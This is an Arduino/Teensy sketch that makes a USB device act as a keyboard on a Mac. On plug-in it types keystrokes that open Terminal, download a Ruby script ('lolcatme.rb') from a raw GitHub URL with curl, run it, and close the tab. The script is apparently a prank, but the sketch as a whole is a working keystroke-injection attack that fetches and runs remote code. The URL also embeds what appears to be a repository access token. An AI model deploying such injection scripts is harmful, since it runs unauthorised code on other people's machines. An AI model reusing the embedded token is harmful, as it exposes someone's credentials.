void setup() {
  delay(800);
  press(KEY_SPACE);
  press(KEY_Z);
  press(KEY_SLASH);
  press(KEY_SPACE);

  // apple space:
  press_with_modifiers(KEY_SPACE, MODIFIERKEY_GUI);

  // activate terminal:
  Keyboard.print("terminal");
  press(KEY_ENTER);

  // open a new tab:
  press_with_modifiers(KEY_T, MODIFIERKEY_GUI);
  delay(500);
  Keyboard.println("cd ~");
  Keyboard.println("curl -fsSL 'https://raw.githubusercontent.com/robacarp/lolcatme/master/lolcatme.rb?token=AAMvB1hJekKlwMPqddCdxyIpD1ne41n0ks5Y96StwA%3D%3D' > lolcatme.rb");
  delay(400);
  Keyboard.println("/System/Library/Frameworks/Ruby.framework/Versions/Current/usr/bin/ruby lolcatme.rb");

  delay(500);
  press_with_modifiers(KEY_D, MODIFIERKEY_CTRL);

  pinMode(11, OUTPUT);
  digitalWrite(11, 1);
}

void press(int key) {
  Keyboard.press(key);
  delay(70);
  Keyboard.release(key);
  delay(70);
}

void press_with_modifiers(int key, int modifiers){
  Keyboard.set_modifier(modifiers);
  Keyboard.send_now();
  delay(150);
  Keyboard.press(key);
  delay(70);
  Keyboard.release(key);
  Keyboard.set_modifier(0);
  Keyboard.send_now();
  delay(150);
}

void loop() {
  // put your main code here, to run repeatedly:

}
